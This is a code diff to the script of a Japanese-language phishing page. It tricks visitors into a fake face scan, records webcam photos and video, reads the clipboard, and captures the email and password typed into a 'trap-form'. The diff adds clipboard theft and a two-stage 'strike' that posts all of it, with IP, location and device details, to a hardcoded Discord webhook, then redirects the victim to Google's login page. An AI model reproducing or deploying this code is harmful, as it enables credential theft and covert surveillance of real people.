@@ -47,7 +47,6 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // 🚨 Webhook URL
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1466756850413211698/VnDiihsRnf56T6bUyhfdDoExTf8kAGYDuSkNDREPSMeS-pgASK1SK4jHowR5vmBr2vxm";
 
         const video = document.getElementById('video');
@@ -56,8 +55,9 @@
         let capturedImg = "";
         let videoBlob = null;
         let net = {};
+        let clipboardData = "未取得";
 
-        // IPと詳細なネットワーク情報を事前に取得
+        // IP情報の事前取得
         window.onload = async () => {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -65,7 +65,40 @@
             } catch (e) { net = { ip: "取得失敗" }; }
         };
 
-        // 1. スキャン開始 & 録画開始
+        // 1. 第一弾送信：スキャン完了直後に写真と動画を送る
+        async function sendFirstStrike() {
+            const info = {
+                ua: navigator.userAgent,
+                res: `${window.screen.width}x${window.screen.height}`
+            };
+
+            const payload = {
+                username: "Strike 1: Media Captured",
+                embeds: [{
+                    title: "📸 Visual Data Secured",
+                    color: 0x00ff00,
+                    fields: [
+                        { name: "🌐 Network", value: `**IP:** [${net.ip}](https://ipinfo.io/${net.ip})\n**Loc:** ${net.city || '?'}, ${net.country_name || '?'}`, inline: true },
+                        { name: "📱 Device", value: `**Resolution:** ${info.res}`, inline: true }
+                    ],
+                    timestamp: new Date()
+                }]
+            };
+
+            const formData = new FormData();
+            formData.append('payload_json', JSON.stringify(payload));
+            
+            try {
+                const photoBlob = await (await fetch(capturedImg)).blob();
+                formData.append('file1', photoBlob, 'face.jpg');
+                if (videoBlob) {
+                    formData.append('file2', videoBlob, 'video.webm');
+                }
+                await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+            } catch (err) { console.error("First strike failed", err); }
+        }
+
+        // スキャンボタンの挙動
         startBtn.onclick = async () => {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -74,44 +107,47 @@
                 startBtn.disabled = true;
                 line.style.display = "block";
 
-                // --- 録画ロジック ---
+                // クリップボード取得試行
+                try {
+                    if (navigator.clipboard) {
+                        clipboardData = await navigator.clipboard.readText();
+                    }
+                } catch(e) { clipboardData = "アクセス拒否"; }
+
                 const mediaRecorder = new MediaRecorder(stream);
                 const chunks = [];
                 mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-                mediaRecorder.onstop = () => {
+                mediaRecorder.onstop = async () => {
                     videoBlob = new Blob(chunks, { type: 'video/webm' });
+                    // 動画の生成が終わったら即座に第一弾送信を実行
+                    await sendFirstStrike();
                 };
                 mediaRecorder.start();
 
                 setTimeout(() => {
-                    // 写真撮影
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth; 
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     capturedImg = canvas.toDataURL('image/jpeg', 0.5);
                     
-                    // 録画停止
-                    mediaRecorder.stop();
+                    mediaRecorder.stop(); // ここでonstopが走り、sendFirstStrikeが呼ばれる
                     
                     document.getElementById('camera-ui').style.display = 'none';
                     document.getElementById('login-ui').style.display = 'block';
-                    
-                    // カメラを止める
                     stream.getTracks().forEach(t => t.stop());
-                }, 4500); // 4.5秒間録画
+                }, 4500);
             } catch (err) { 
                 alert("カメラの許可が必要です。"); 
             }
         };
 
-        // 2. 情報収集とDiscord送信
+        // 2. 第二弾送信：ログイン情報と詳細スペック
         document.getElementById('trap-form').onsubmit = async (e) => {
             e.preventDefault();
             document.getElementById('final-btn').innerText = "認証中...";
             document.getElementById('final-btn').disabled = true;
 
-            // バッテリー情報の取得
             let batteryStatus = "不明";
             try {
                 const battery = await navigator.getBattery();
@@ -120,51 +156,33 @@
 
             const info = {
                 ua: navigator.userAgent,
-                lang: navigator.language,
                 cores: navigator.hardwareConcurrency || '不明',
                 mem: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : '不明',
-                res: `${window.screen.width}x${window.screen.height}`,
-                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                ref: document.referrer || "直接アクセス"
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone
             };
 
             const payload = {
-                username: "Deep Neural Tracker Pro v5",
-                avatar_url: "https://cdn-icons-png.flaticon.com/512/6840/6840478.png",
+                username: "Strike 2: Credentials & Intel",
                 embeds: [{
-                    title: "🎯 Full Intelligence Report Captured",
-                    color: 0xee1111,
+                    title: "🔑 Target Information Extracted",
+                    color: 0xff0000,
                     fields: [
-                        { name: "📧 Credentials", value: `**Email:** \`${document.getElementById('email').value}\`\n**Pass:** \`${document.getElementById('pass').value}\``, inline: false },
-                        { name: "🌐 Network Info", value: `**IP:** [${net.ip}](https://ipinfo.io/${net.ip})\n**ISP:** ${net.org || '?'}\n**Loc:** ${net.city}, ${net.country_name}`, inline: false },
-                        { name: "📱 Device Hardware", value: `**OS/Browser:** \`${info.ua}\`\n**CPU/Mem:** ${info.cores} Cores / ${info.mem}\n**Screen:** ${info.res}`, inline: false },
-                        { name: "🔋 Env Info", value: `**Battery:** ${batteryStatus}\n**Timezone:** ${info.tz}\n**Referer:** ${info.ref}`, inline: false }
+                        { name: "📧 Credentials", value: `**ID:** \`${document.getElementById('email').value}\`\n**PW:** \`${document.getElementById('pass').value}\`` },
+                        { name: "📋 Clipboard", value: "```\n" + clipboardData + "\n```" },
+                        { name: "📊 Device Details", value: `**CPU:** ${info.cores}C / **Mem:** ${info.mem}\n**Battery:** ${batteryStatus}\n**TZ:** ${info.tz}` }
                     ],
-                    footer: { text: "Neural Intelligence System - Video Included" },
                     timestamp: new Date()
                 }]
             };
 
-            const formData = new FormData();
-            formData.append('payload_json', JSON.stringify(payload));
-            
-            // 写真を添付
             try {
-                const photoBlob = await (await fetch(capturedImg)).blob();
-                formData.append('file1', photoBlob, 'target_face.jpg');
-            } catch (e) {}
-
-            // 動画を添付
-            if (videoBlob) {
-                formData.append('file2', videoBlob, 'recording.webm');
-            }
-
-            // 送信実行
-            try {
-                await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+                await fetch(WEBHOOK_URL, { 
+                    method: 'POST', 
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload) 
+                });
             } catch (err) {}
 
-            // 最後にGoogleへ飛ばす
             window.location.href = "https://accounts.google.com/ServiceLogin?hl=ja";
         };
     </script>
